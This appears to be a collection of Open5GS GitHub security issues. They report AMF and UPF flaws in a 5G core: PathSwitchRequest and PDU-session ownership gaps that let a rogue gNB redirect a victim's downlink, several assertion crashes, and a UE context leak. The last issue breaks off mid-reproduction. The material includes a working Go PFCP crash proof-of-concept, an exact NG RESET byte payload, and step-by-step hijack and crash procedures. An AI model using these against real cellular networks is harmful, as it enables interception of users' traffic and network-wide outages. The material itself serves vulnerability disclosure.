items.title: [Security Bug]: AMF accepts NGAP PathSwitchRequest without ownership check + Crashes due to race condition

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (main @ `ee596937d`, v2.8.0-76). 
Still unfixed on current main (source-checked 2026-09-04 @ `941e4cc2d`).

### Security impact

Any associated peer can re-home a live UE's NGAP context and redirect
its downlink FAR to an attacker-chosen endpoint due to a lack of ownership in the
referenced UE context. The redirection of the victim's downlink stream to 
an attacker-controlled endpoint is the confidentiality/integrity impact, and the controlled 
outage is the availability impact.

**Update: The same primitive can also be used to trigger AMF process abort with no SMF 
precondition due to race condition**

**CVSS v3.1 Score: 8.8 (High)** - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### Affected components

The **AMF** — NGAP PathSwitchRequest handling
(`src/amf/ngap-handler.c`, `ngap_handle_path_switch_request()`) and the
UE-context/`ran_ue` management it drives.

### Summary

`ngap_handle_path_switch_request()` resolves the target UE with a global
lookup by the AMF_UE_NGAP_ID carried in the message
(`ran_ue_find_by_amf_ue_ngap_id()`, `src/amf/ngap-handler.c:3074`) and
never verifies that the sending NGAP association is the one that
currently owns (serves) that UE context. Any associated gNB, including
a rogue gNB smuggled out of a UE data plane, can re-home a
live peer UE's NGAP context to itself by knowing or enumerating the
peer's AMF_UE_NGAP_ID. After acceptance, the AMF runs its normal 
path-switch chain: the context move is logged
([OLD]/[NEW] RAN_UE_NGAP_ID), the handler's PDU-session loop sends an
N11 SM-context update, and the SMF/UPF rewrite the victim's downlink
FAR toward the attacker's endpoint (UPF `gtp_connect() [10.45.0.9]:2152`). 
The victim's downlink was measurably cut and recovered only
when the victim re-registered (a full re-registration on a new address).

This bug can also be used to trigger a race condition assert.
1. The PathSwitchRequest handler switches the victim's context to the
   sender's gNB with no ownership check
   (`ran_ue->gnb_id = gnb->id`).
2. When that association goes down, `amf_gnb_remove()` frees the
   `amf_gnb_t` while the per-UE deactivation chain (N11/PFCP for the
   victim's live PDU sessions) is still in flight. The `ran_ue` is not
   reaped (the sweep skips it because the deactivation created new SBI
   transactions) but keeps pointing at the freed gNB.
3. A PathSwitchRequest re-claim for the victim's AMF_UE_NGAP_ID
   arriving inside that window (delta ≈ 0–1 ms observed) resolves the
   still-alive context, then `ran_ue_switch_to_gnb()` resolves the
   dangling `gnb_id` → `amf_gnb_find_by_id()` returns NULL →
   `ogs_assert(gnb)` aborts `open5gs-amfd`
   (`src/amf/context.c:1451`). amfd is left `<defunct>`; every NGAP
   service is lost until the open5gs containers restart.

These issues are still present on current main (`1f70b24c`).
The RAN-node-ownership enforcement commit `9a22baa76`
("Enforce RAN node ownership in handover handlers") adds
`source_ue->gnb_id != gnb->id` checks to the NGAP/S1AP handover handlers
but its own commit message explicitly excludes PathSwitchRequest.

### Steps to reproduce
#### Issue A: PathSwitchRequest from any peer.
Lab: Two attached UEs.
* Attacker UE `10.45.0.9`
* Benign peer UE `10.45.0.8`
* Core container `192.168.233.132` hosting both AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).

1. Attach both UEs.
2. From the attacker UE, open an SCTP association to
   `192.168.233.132:38412` with inner IP packets sent as ordinary uplink
   IP packets through the attacker's established PDU session (the UPF
   decapsulates and the kernel delivers them to the AMF, as in the PFCP
   smuggling path). AMF log: `gNB-N2 accepted[10.45.0.9]:33250 in
   ng-path module`.
3. Complete NG Setup with a gNB ID distinct from the real gNB (fake gNB
   ID 2) and the lab PLMN/TAC (001/01, TAC 1) — NGSetupResponse,
   successfulOutcome (proc 21), 54 bytes.
4. Probe PathSwitchRequest candidates (attacker-chosen RAN_UE_NGAP_ID
   5000, UserLocationInformation with the lab TAC): ErrorIndication-sweep
   the 60 unknown AMF_UE_NGAP_IDs (3–7, 10–64, PDU Session ID 1), then
   send three probes each (PDU Session IDs 1, 2, 3) to the two live IDs
   — the peer's (8) and the attacker's own (9). Record per-candidate
   responses.
5. The peer's live ID 8 with session 1 is accepted: verify the
   `[OLD]`/`[NEW]` context move in the AMF log, the UPF Session
   Modification with `gtp_connect() [10.45.0.9]:2152` two milliseconds
   later, and re-measure the peer's downlink. The attacker's own ID 9 is
   likewise accepted (context re-homed, UPF session modified) but its
   probes draw no decodable response.

#### Issue B: Crash AMF
Lab: Two attached UEs.
* Attacker UE (PDU-session address `10.45.0.2`
* Benign peer UE `imsi-001010123456790` with a live PDU session.
* Core container `192.168.233.132` hosting AMF (NGAP SCTP 38412) and UPF (GTP-U 2152).
Script: `r8b_race.py` (attached zip; staged in the attacker UE container with
the `ueprobe` package and `pycrate`); the associations are smuggled as
ordinary uplink IP packets through the attacker's PDU session.

1. Attach both UEs (the peer's live session is what keeps its `ran_ue`
   alive through the removal).
2. From the attacker UE open association B (NG Setup, gNB ID 3), then
   association A (NG Setup, gNB ID 2). Both get NGSetupResponse
   (successfulOutcome, proc 21).
3. Re-home the peer's context onto A: PathSwitchRequest from A
   (attacker-chosen `RAN_UE_NGAP_ID` 5000, the peer's live
   `AMF_UE_NGAP_ID`, UserLocationInformation with the lab TAC) →
   PathSwitchRequestAcknowledge (proc 25).
4. SHUTDOWN A and, delta = 0, send the re-claim PathSwitchRequest for
   the peer's ID from B (single burst pre-associated, no handshake
   inside the window). The script sweeps delta 0–40 ms in 0.4 ms steps
   for robustness.
5. Detect: no response to the re-claim and a fresh NG Setup that gets
   no answer, meaning that amfd is gone. The script's liveness check is a full NG
   Setup exchange (a raw-SCTP connect alone cannot see a dead peer).

### Logs (Attached)
#### Issue A: PathSwitchRequest from any peer.
[R8-amf-pathswitch-context-hijack.zip](https://github.com/user-attachments/files/31734861/R8-amf-pathswitch-context-hijack.zip)

```shell
[amf] INFO: gNB-N2 accepted[10.45.0.9]:33250 in ng-path module
[amf] INFO: PathSwitchRequest
[amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[3]    (x60: ids 3..7 and 10..64, cause radioNetwork=14)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[8] AMF_UE_NGAP_ID[8]     (14:33:27.685 — peer's live ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[8]
[upf] DEBUG: Session Modification Request                     (14:33:27.687)
[gtp] INFO: gtp_connect() [10.45.0.9]:2152                    (14:33:27.687)
[amf] INFO:     [OLD] RAN_UE_NGAP_ID[9] AMF_UE_NGAP_ID[9]     (14:33:27.851 — attacker's own ID)
[amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[9]
[upf] DEBUG: Session Modification Request                     (14:33:27.852)
```

(all lines from `q023_amf.log` and `q023_upf.log`. `q023_smf.log`'s
capture starts at 14:33:28.167, so the N11 SM-context update has no
SMF-side line; the only `POST /nsmf-pdusession/v1/sm-contexts/7/modify`
in it is at 14:34:05.777 — the association-release-phase modify for the
victim's session, after which the downlink stayed cut.)

(Each accepted path switch also logs `UE Security Capability mismatch in PathSwitchRequest`.
Per TS 33.501 6.7.3.1 comment in the handler, the AMF answers a mismatched
PathSwitchRequest with its locally stored UE security capabilities in
the PathSwitchRequestAcknowledge (`ngap-handler.c:3310-3314`).)

58 diverted GTP-U datagrams were captured on
the attacker's UDP 2152 listener (`q023_sink.jsonl`), all on the
attacker's own-session TEID 0xa5000091, none on the peer-session TEID
0xa5000081 (attacker-chosen and installed by the AMF in the victim's
downlink FAR).

#### Issue B: Crash AMF

[R8b-amf-pathswitch-context-hijack-crash.zip](https://github.com/user-attachments/files/31863769/R8b-amf-pathswitch-context-hijack-crash.zip)

Run 4 of 4 (11:09:06), verbatim from `amf.log`
(`amf-crash-r8b3-w4.log` in the zip; runs 1–3 in `amf-crash-r8b3-w1/2/3.log`):

    09/05 11:09:05.944: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:05.944: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[4] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [OLD] TAC[1] CellID[0x10] (ngap-handler.c:3104)
    09/05 11:09:05.944: [amf] INFO:     [NEW] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:05.944: [amf] INFO:     [NEW] TAC[1] CellID[0x10] (ngap-handler.c:3306)
    09/05 11:09:06.495: [amf] INFO: gNB-N2[10.45.0.2] connection refused!!! (amf-sm.c:882)
    09/05 11:09:06.495: [amf] INFO: [Removed] Number of gNBs is now 2 (context.c:1305)
    09/05 11:09:06.495: [amf] INFO: PathSwitchRequest (ngap-handler.c:3009)
    09/05 11:09:06.495: [amf] INFO:     [OLD] RAN_UE_NGAP_ID[5000] AMF_UE_NGAP_ID[4]
    09/05 11:09:06.496: [amf] INFO:     [OLD] TAC[1] CellID[0x10]
    09/05 11:09:06.496: [amf] FATAL: ran_ue_switch_to_gnb: Assertion `gnb' failed. (../open5gs-src/src/amf/context.c:1451)
    09/05 11:09:06.496: [core] FATAL: backtrace() returned 11 addresses (../open5gs-src/lib/core/ogs-abort.c:37)

Four consecutive runs, identical fingerprint, delta = 0 each time:

| run | re-home | `[Removed]` | re-claim → FATAL (`context.c:1451`) |
|-----|-----------------|--------------------|--------------------------------------|
| 1   | 10:55:58.825    | 10:55:59.376       | 10:55:59.377                         |
| 2   | 11:01:26.841    | 11:01:27.391       | 11:01:27.392                         |
| 3   | 11:06:44.628    | 11:06:45.179       | 11:06:45.180                         |
| 4   | 11:09:05.944    | 11:09:06.495       | 11:09:06.496                         |

After each abort `open5gs-amfd` is `<defunct>` (zombie; no child reaper
restarts it) meaning that we get no NGAP service until the open5gs containers restart.

### Expected behaviour

The AMF must verify that the NGAP association sending a
PathSwitchRequest is the association that currently owns (serves) the
referenced UE context, and reject otherwise (cause: unexpected NGAP peer
/ unknown local UE NGAP-ID) without leaking which AMF_UE_NGAP_IDs are
live. Additionally, the AMF must never resolve a UE context to a freed gNB. The association
close and the UE-context cleanup must be ordered so no `ran_ue` can
outlive the gNB it points at. A re-claim for a context the sender does not own
should additionally fail the ownership check before any switch.
**Upstream itself applied exactly this class of ownership check to
the neighbouring handlers in `9a22baa76`.**

### Observed Behaviour
#### Issue A: PathSwitchRequest from any peer.
```c
/* src/amf/ngap-handler.c @ ee596937d — ngap_handle_path_switch_request() */
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);        /* :3074 — global lookup */
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]",
            (long long)amf_ue_ngap_id);
    r = ngap_send_error_indication(
            gnb, (uint64_t *)RAN_UE_NGAP_ID, &amf_ue_ngap_id,
            NGAP_Cause_PR_radioNetwork,
            NGAP_CauseRadioNetwork_unknown_local_UE_NGAP_ID);
    return;
}
amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
…
/* Change ran_ue to the NEW gNB after mandatory IE validation */   /* :3288 */
ran_ue_switch_to_gnb(ran_ue, gnb);                                  /* :3289 */
ogs_info("    [NEW] RAN_UE_NGAP_ID[%lld] AMF_UE_NGAP_ID[%lld] ",    /* :3291 */
    (long long)ran_ue->ran_ue_ngap_id, (long long)ran_ue->amf_ue_ngap_id);
```

The lookup is global across all gNB associations: `gnb` (the sending
association) is never compared with the context's serving gNB. The
ErrorIndication branch at `:3074-3085` is the enumeration oracle — it
distinguishes "no such UE" from "accepted" on the same ID space. After
acceptance the handler logs the `[OLD]`/`[NEW]` move and proceeds into
the N11/N4 modification chain.

#### Issue B: Crash AMF
`ogs_assert(gnb)` fails in `ran_ue_switch_to_gnb()` (`context.c:1451`)
and amfd aborts as `<defunct>` zombie and we get no NGAP service until the
containers restart.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: UPF crashes on PFCP Session Establishment when F-TEID.CH set and address family mismatches DNN resource

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Description

Open5GS UPF crashes with a reachable assertion during PFCP **Session Establishment** when **F-TEID has CH=1** and its **IPv4/IPv6 flag(s)** do **not match** the address family of the UPF's **GTP-U resource** for the selected **DNN** (Network Instance).

The crash occurs at `lib/pfcp/context.c` inside `ogs_pfcp_object_teid_hash_set()` on the assertion:


In other words, if the DNN has **IPv4-only** resource while the incoming CreatePDR/PDI/F-TEID is **CH=1 with IPv6-only** (or vice versa), the condition is false and UPF crashes.



---

### Open5GS Release, Revision, or Tag

-  v2.7.5-49-g465e90f

---





### Steps to reproduce

1. Start UPF with a DNN (e.g., `internet`) that has **IPv4-only** GTP-U resource (no IPv6).
2. Establish PFCP association (Association Setup Request).
3. Send **PFCP Session Establishment Request (type=50)** with:
   - `CreatePDR → PDI → NetworkInstance = "internet"` (valid FQDN encoding)
   - `CreatePDR → PDI → F-TEID` where:
     - `CH = 1`
     - **Only IPv6 flag set** (`v6=1`, `v4=0`)
     - Provide a syntactically valid IPv6 address and a non-zero `choose_id`
   - (Whether Restoration Indication is present does not change the crash behavior.)

> If the UPF’s DNN resource is IPv6-only, the symmetric case (`v4=1`, `v6=0` with valid IPv4 address) also crashes.

1. Start a new go project inside a new folder: go mod init poc
2. Create a main.go and paste the code below:
package main
```
import (
	"flag"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

func forcePFCPv1(pkt []byte) { // set version=1, keep low 5 bits
	if len(pkt) > 0 {
		pkt[0] = (1 << 5) | (pkt[0] & 0x1F)
	}
}

func assocSetup(seq uint32, nodeIP net.IP) []byte {
	p, _ := message.NewAssociationSetupRequest(seq, ie.NewNodeID(nodeIP.String(), "", "")).Marshal()
	forcePFCPv1(p)
	return p
}

// Minimal CHv6 PoC: Session Establishment with F-TEID flags v6|CH and legal IPv6 value.
func seCHv6(seq uint8, nodeIP net.IP, dnn string) []byte {
	v6 := net.ParseIP("2001:db8::1")
	p, _ := message.NewSessionEstablishmentRequest(
		seq, 0, 0, 1, 0,
		ie.NewNodeID(nodeIP.String(), "", ""),
		ie.NewFSEID(0x0, nodeIP, nil),
		ie.NewCreatePDR(
			ie.NewPDRID(0),
			ie.NewPDI(
				ie.NewSourceInterface(0),
				ie.NewNetworkInstance(dnn),
				ie.NewFTEID(6 /* v6|ch */, 0x12345678, nil, v6, 1 /* chooseID */),
			),
		),
		ie.NewPFCPSEReqFlags(1), // RI=true for stable repro
	).Marshal()
	forcePFCPv1(p)
	return p
}

func main() {
	var (
		host = flag.String("host", "127.0.0.1", "UPF PFCP address")
		port = flag.Int("port", 8805, "UPF PFCP port")
		node = flag.String("node", "1.1.1.1", "NodeID/F-SEID IPv4 used in requests")
		dnn  = flag.String("dnn", "internet", "PDI NetworkInstance (DNN)")
		wait = flag.Duration("wait", 200*time.Millisecond, "wait between messages")
	)
	flag.Parse()

	dst := fmt.Sprintf("%s:%d", *host, *port)
	nodeIP := net.ParseIP(*node)
	if nodeIP == nil {
		log.Fatalf("invalid node IP: %s", *node)
	}

	conn, err := net.Dial("udp", dst)
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	defer conn.Close()

	// 1) Association Setup (seq=1)
	if _, err := conn.Write(assocSetup(1, nodeIP)); err != nil {
		log.Fatalf("assoc send: %v", err)
	}
	log.Printf("sent AssociationSetupRequest seq=1")
	time.Sleep(*wait)

	// 2) Send exactly two Session Establishments (CHv6) seq=2 and seq=3
	if _, err := conn.Write(seCHv6(2, nodeIP, *dnn)); err != nil {
		log.Fatalf("se send seq=2: %v", err)
	}
	log.Printf("sent SessionEstablishment (chv6, RI=true, seq=2)")
	time.Sleep(*wait)
	if _, err := conn.Write(seCHv6(3, nodeIP, *dnn)); err != nil {
		log.Fatalf("se send seq=3: %v", err)
	}
	log.Printf("sent SessionEstablishment (chv6, RI=true, seq=3)")
}
```
3. Download required libraries: `go mod tidy`
4. Run the program with the upf pfcp server address: `go run ./main.go -host 172.22.0.8 -port 8805 -node 1.1.1.1 -dnn internet -wait 200ms`


### Expected behaviour
it should gracefully fail the request (e.g., return an appropriate PFCP Cause in the Session Establishment Response) or, if the implementation policy allows, choose a compatible local F-TEID for that DNN.

### Observed Behaviour
The UPF crashes when receiving the crafted packet.

items.title: [Bug]: AMF - remote crash (assertion \`gnb->ng_reset_ack\`) on a cross-gNB NG RESET

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

2.8.0

### Steps to reproduce

## Summary

A single, unauthenticated **NG RESET** (`ResetType = partOfNG-Interface`) that lists an
`AMF-UE-NGAP-ID` **belonging to a UE served by a *different* gNB** aborts the AMF with

```
FATAL: amf_nsmf_pdusession_handle_update_sm_context:
       Assertion `gnb->ng_reset_ack' failed. (../src/amf/nsmf-handler.c:928)
```

The whole `open5gs-amfd` process dies (`SIGABRT`), so this is a remote DoS affecting **every
UE on the AMF**, not just the referenced one. It only requires that the referenced UE has an
active PDU session (so the session release is asynchronous). No security context, no NAS, and
no ownership of the victim UE is needed — only an accepted NG association (i.e. an N2 link
without IPsec) and a small, enumerable `AMF-UE-NGAP-ID`.

## Steps to reproduce

1. Bring up the AMF with at least one UE registered **and with an active PDU session**
   through a legitimate gNB (call the UE's id `AMF-UE-NGAP-ID = V`; e.g. UERANSIM UE, `V=2`).
2. From a **second** gNB association (any NG-Setup-accepted peer — in the lab a small Python
   fake gNB over SCTP/PPID 60), send one NG RESET:
   - `Cause`: `misc / om-intervention`
   - `ResetType`: `partOfNG-Interface`, one item `{ AMF-UE-NGAP-ID = V, RAN-UE-NGAP-ID = 99 }`
   - Exact APER bytes (22): `00140012000002000f40018600580006400160020063`
     (this is `AMF-UE-NGAP-ID=2`; change the last IE to your `V`)
3. The AMF replies with `NGResetAcknowledge`, then aborts a few milliseconds later when the
   victim's SMF `UpdateSMContext` (session release) completes.

pcap attached (`ngreset.pcap`), dissects as `NGAP / NGReset / partOfNG-Interface`.

## Logs

```
07/10 ..: [amf] INFO: NGReset (../src/amf/ngap-handler.c:4867)
07/10 ..: [amf] INFO:     NGAP_ResetType_PR_partOfNG_Interface (../src/amf/ngap-handler.c:4952)
07/10 ..: [amf] INFO: [Removed] Number of gNBs is now 1 (../src/amf/context.c:1305)
07/10 ..: [amf] INFO: [Removed] Number of gNB-UEs is now 0 (../src/amf/context.c:2939)
07/10 ..: [amf] FATAL: amf_nsmf_pdusession_handle_update_sm_context:
                 Assertion `gnb->ng_reset_ack' failed. (../src/amf/nsmf-handler.c:928)
07/10 ..: [core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
    open5gs-amfd(+0xba8d)
    libogscore.so.2(ogs_fsm_dispatch+0x119)
    ...
/open5gs_init.sh: line 86: 8 Aborted   open5gs-amfd
```
Container/process exit status: `134` (128 + SIGABRT).

## Root cause (code flow)

The `partOfNG-Interface` reset loop resolves the referenced UE with an **unbound global
lookup** and never checks that the UE belongs to the gNB that sent the reset:

`src/amf/ngap-handler.c` (NG Reset handler):
```c
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);   // :5217  (no gnb_id binding)
...
ran_ue->part_of_ng_reset_requested = true;                // :5243
...
amf_sbi_send_deactivate_all_sessions(
    ran_ue, amf_ue, AMF_REMOVE_S1_CONTEXT_BY_RESET_PARTIAL, ...);   // :5258 (async if a PDU session is active)
...
gnb->ng_reset_ack = ogs_ngap_build_ng_reset_ack(partOfNG_Interface);   // :5181 — stored on the SENDER gNB
```

When the referenced UE has an active PDU session, the release is asynchronous, so its `ran_ue`
survives the handler; the SENDER's `ng_reset_ack` is sent and cleared normally. Later the
session-release completion runs:

`src/amf/nsmf-handler.c`, `amf_nsmf_pdusession_handle_update_sm_context()`,
state `AMF_REMOVE_S1_CONTEXT_BY_RESET_PARTIAL`:
```c
gnb = amf_gnb_find_by_id(ran_ue->gnb_id);   // :911 — the VICTIM's OWNING gNB, not the sender
...
ran_ue_remove(ran_ue);                       // :915
if (gnb) {
    ogs_list_for_each(&gnb->ran_ue_list, iter) { if (iter->part_of_ng_reset_requested) return OGS_OK; }
    ogs_assert(gnb->ng_reset_ack);           // :928/930  <-- ABORTS
    ...
}
```

`gnb` here is resolved from the **victim's** `ran_ue->gnb_id`, i.e. the legitimate owning gNB —
which never sent an NG Reset, so its `ng_reset_ack` is `NULL` and the assertion fires. In the
normal (non-cross-gNB) case sender == owner, so the field is set and the bug is masked. The
missing `ran_ue->gnb_id != gnb->id` check at `:5217` is what lets sender ≠ owner and drives the
completion path onto the wrong gNB.

### Logs

```shell

```

### Expected behaviour

An NG Reset from gNB A that references a UE owned by gNB B should be rejected/ignored for that
UE (per the ownership binding already enforced elsewhere, e.g. the `ran_ue->gnb_id != gnb->id`
check used by `UEContextReleaseRequest`), and in no case should it be able to abort the AMF.

### Observed Behaviour

The AMF processes the cross-gNB reset, tears down the remote UE's session, and then aborts on
the `ogs_assert(gnb->ng_reset_ack)` in the async release path — crashing the whole AMF.

## Suggested fix

1. **Bind the reset to the sender** in the `partOfNG-Interface` loop — after
   `ran_ue_find_by_amf_ue_ngap_id()` (`ngap-handler.c:5217`), skip entries where
   `ran_ue->gnb_id != gnb->id` (mirroring the inlined check in
   `ngap_handle_ue_context_release_request`). This fixes both the crash and the cross-gNB
   teardown.
2. **Defensive**: in `nsmf-handler.c` (`:928/930`), guard the send instead of asserting —
   `if (gnb->ng_reset_ack) { ngap_send_to_gnb(...); gnb->ng_reset_ack = NULL; }` — so a NULL
   ack buffer can never abort the process.

### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: AMF/SMF stale UE context after gNB SCTP reconnection causes PDU session failure (HTTP 400)

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
**Description**

When a gNB disconnects and reconnects (e.g. during cell reconfiguration that requires lock/unlock), some UEs — particularly iPhone 17 Pro Max — end up in a state where they are registered but have no data connectivity. The SMF logs show repeated HTTP response error [400] when attempting N1N2 message transfer.

  **Environment**
  - Open5GS v2.7.6 on Ubuntu 22.04
  - Commercial 5G SA gNB (NR TDD, n77)
  - UE: iPhone 17 Pro Max with dual SIM (private 5G eSIM + commercial SIM)
  - iPhone 14 on the same cell does not exhibit this issue

  **Steps to Reproduce**
  1. gNB connected to Open5GS AMF via SCTP, UEs attached with active PDU sessions
  2. gNB performs cell reconfiguration (internally does lock/unlock, dropping SCTP association)
  3. SCTP association re-establishes, gNB sends NG Setup Request, AMF accepts
  4. iPhone re-registers (Registration complete logged in AMF)
  5. iPhone requests PDU session — SMF creates session and assigns IP
  6. SMF sends N1N2 message transfer to AMF — gets HTTP 400
  7. Session removed, iPhone retries every ~16 seconds, same failure
  8. iPhone shows "attached" but has no data connectivity

  **AMF/SMF Log**
```
  [gmm] INFO: [imsi-xxxx] Registration complete
  [gmm] INFO: UE SUPI[imsi-xxxx] DNN[internet] S_NSSAI[SST:1 SD:0xffffff] smContextRef[NULL]
  [smf] ERROR: [imsi-xxxx:1] HTTP response error [400]
  [amf] ERROR: No UE context [imsi-xxxx]
  [amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[64]
```
  **Expected Behaviour**
When the SCTP association drops, the AMF should fully clean up all UE contexts (AMF-UE, RAN-UE, and associated SMF sessions). When the gNB reconnects and UEs re-register, they should get a completely fresh context with working PDU sessions.

  **Workaround**
Restarting open5gs-amfd and open5gs-smfd after the gNB reconnects clears the stale state and UEs connect successfully on the next attempt.

  **Additional Notes**
  - The issue is more pronounced with iPhone 17 Pro Max than iPhone 14
  - The gNB's SCTP disconnect/reconnect happens within seconds
  - UPF data path is confirmed working (ping from UPF to UE IP succeeds) but zero packets appear on ogstun from the affected UE

items.title: AMF UE Context Resource Leak After SCTP Disconnection During Incomplete Registration

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
**Description**  
After a series of incomplete UE registration procedures where the NG‑RAN node closes the SCTP association after receiving a NAS Identity Request, the AMF exhausts its internal UE context pool. New registration attempts then fail with a `UE CONTEXT RELEASE COMMAND` containing cause `control processing overload`, even though no other UE contexts are active and only a single SCTP association exists.

The log from the AMF shows:  
`[amf] ERROR: Could not allocate amf_ue context from pool (../src/amf/context.c:1589)`

**Steps to Reproduce**  
1. Establish an NG‑C SCTP association between NG‑RAN node and AMF (NG Setup completes successfully).  
2. NG‑RAN node sends `INITIAL UE MESSAGE` with a Registration Request.  
3. AMF sends `DOWNLINK NAS TRANSPORT` containing an Identity Request.  
4. NG‑RAN node closes the SCTP association.  
5. Repeat steps 1-4 1024 times.  
6. Attempt a fresh NG Setup and a single `INITIAL UE MESSAGE` with a Registration Request.  

**Expected Behavior**  
- On SCTP disconnection, the AMF shall immediately release all UE‑associated logical NG‑connections that were using that transport association, as required by the NGAP protocol (TS 38.413 §6, §8.7.1, §8.7.4).  
- After each disconnection, the AMF internal UE context pool should be freed.  
- Subsequent registration attempts should succeed (assuming no other capacity limits).  

**Actual Behavior**  
- After multiple SCTP disconnections, the AMF’s UE context pool is exhausted.  
- New registration attempts are rejected with `UE CONTEXT RELEASE COMMAND cause = "control processing overload"`.  
- The AMF log reports: `[amf] ERROR: Could not allocate amf_ue context from pool (../src/amf/context.c:1589)`.  
- The rejection persists until the AMF is restarted.

**Impact**  
The AMF becomes unable to serve any new UE, despite having no real overload. Only a restart of the AMF restores the service.

**Additional Information** 
The leak only occurs when NG-RAN drops the SCTP association **before** the Identity Response is sent, but not after the Authentication Request.

items.title: [Bug]: UE Downlink Redirection via Forged PDUSessionResourceSetupResponse

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Summary

The AMF in Open5GS v2.7.6 resolves the UE context for an incoming `PDUSessionResourceSetupResponse` by looking up the `AMF-UE-NGAP-ID` in a process-wide pool, without verifying that the sending NG-RAN node owns the UE-associated logical NG-connection identified by that ID. A second gNB that has completed its own NG Setup with the AMF can submit a `PDUSessionResourceSetupResponse` carrying another UE's `AMF-UE-NGAP-ID` together with an attacker-controlled GTP-U tunnel endpoint. The AMF accepts the response and relays the supplied transfer to the SMF, which in turn reprograms the UPF — causing the victim UE's downlink user-plane traffic to be forwarded to the attacker's gNB.

### Details

**Affected Files:**
- `src/amf/context.c:1475` — `ran_ue_find_by_amf_ue_ngap_id()`
- `src/amf/ngap-handler.c:1959` — `ngap_handle_pdu_session_resource_setup_response()` invocation

**Root Cause:**

The lookup primitive used to resolve a UE on `PDUSessionResourceSetupResponse` ignores which gNB the message arrived on. `ran_ue_find_by_amf_ue_ngap_id()` is a thin wrapper over a process-wide pool lookup keyed solely by the AMF-side ID:

```c
// src/amf/context.c:1475
ran_ue_t *ran_ue_find_by_amf_ue_ngap_id(uint64_t amf_ue_ngap_id)
{
    return ran_ue_find(amf_ue_ngap_id);   // ogs_pool_find on ran_ue_pool — no gnb scoping
}
```

For comparison, the sibling lookup `ran_ue_find_by_ran_ue_ngap_id()` (context.c:1457) takes an `amf_gnb_t *gnb` argument and walks only that gNB's `ran_ue_list` — so the scoping primitive exists, but the AMF-UE-NGAP-ID path does not use it.

The PDU session response handler then resolves and proceeds with the response without comparing the sending gNB (`gnb`, the SCTP/TNLA the message was received on) to the gNB that owns the resolved UE context (`ran_ue->gnb`):

```c
// src/amf/ngap-handler.c:1959
ran_ue = ran_ue_find_by_amf_ue_ngap_id(amf_ue_ngap_id);
if (!ran_ue) {
    ogs_error("No RAN UE Context : AMF_UE_NGAP_ID[%lld]", ...);
    /* sends Error Indication, returns */
}

/* No check of the form: if (ran_ue->gnb != gnb) { reject; } */

amf_ue = amf_ue_find_by_id(ran_ue->amf_ue_id);
...
/* PDUSessionResourceSetupResponseTransfer is forwarded to the SMF */
```

A second gNB that has completed its own NG Setup with the AMF can therefore submit a `PDUSessionResourceSetupResponse` whose `AMF-UE-NGAP-ID` belongs to a UE attached via a different gNB; the AMF resolves that UE's context and relays the attacker-supplied transfer (containing the GTP-U tunnel endpoint that the UPF should use for downlink delivery) to the SMF as if the response had come from the legitimate serving gNB.

**Propagation / User-Plane Impact:**

The `PDUSessionResourceSetupResponseTransfer` carries the N3 tunnel endpoint (GTP-U IP and TEID) the UPF should forward downlink user traffic to. Once the AMF accepts the forged response, it forwards the transfer to the SMF via `Nsmf_PDUSession_UpdateSMContext` (`POST /nsmf-pdusession/v1/sm-contexts/{ref}/modify`). The SMF in turn issues a PFCP `Session Modification Request` to the UPF, which installs/updates the corresponding Forwarding Action Rule. From that moment, the victim UE's downlink user-plane traffic is delivered to the attacker's gNB.

### PoC

**Environment:**
- Open5GS v2.7.6
- AMF NGAP listener: `10.3.0.4:38412`
- UERANSIM v3.2.7 , two independent gNBs against the same AMF:
  - gNB-A: `10.3.0.3` (NCI=0x10, RAN_ID=1)
  - gNB-B: `10.3.0.33` (NCI=0x20, RAN_ID=2) — attacker, no UE of its own

**Reproduction Steps:**

1. Bring up the Open5GS stack and register a victim UE through gNB-A (NG Setup → Registration → Authentication → Security Mode → PDU Session Setup). The UE obtains a PDU session and is reachable for downlink traffic. 

2. Start gNB-B against the same AMF and let it complete its own NG Setup. gNB-B has no attached UE.

3. From gNB-B, send **a single** `PDUSessionResourceSetupResponse` carrying:
